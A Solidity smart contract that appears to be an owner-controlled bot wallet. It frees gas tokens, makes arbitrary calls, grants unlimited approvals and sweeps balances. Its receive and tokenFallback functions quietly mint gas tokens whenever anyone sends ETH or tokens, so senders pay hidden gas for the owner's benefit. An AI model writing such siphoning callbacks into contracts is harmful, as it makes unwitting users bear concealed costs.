contract Fallback {

    address payable public owner;

    constructor () {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender==owner, "Ownable: caller is not the owner");
        _;
    }

    function _transferOwnership(address payable newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        owner = newOwner;
    }

    function tokenFallback(address _from, uint _value, bytes calldata _data) public {
        IERC20(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c).mint(15);
    }

    function recovergas() onlyOwner public {
        selfdestruct(msg.sender);
    }

    function withdraw() onlyOwner public {
        msg.sender.send(address(this).balance);
    }

    function FreeAndCall(address to,uint256 amount,uint256 val,bytes calldata dat) onlyOwner external {
        IERC20(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c).free(amount);
        to.call{value:val}(dat);
    }

    function GFreeAndCall(address to,uint256 amount,uint256 val,bytes calldata dat) onlyOwner external {
        IERC20(0x0000000000b3F879cb30FE243b4Dfee438691c04).free(amount);
        to.call{value:val}(dat);
    }

    function approve(address from,address spender) onlyOwner public {
        IERC20(from).approve(spender,uint256(int256(-1)));
    }

    function extract(address from,address to) onlyOwner public {
        IERC20(from).transfer(to,IERC20(from).balanceOf(address(this)));
    }

    receive() external payable {
        IERC20(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c).mint(340);
    }
}
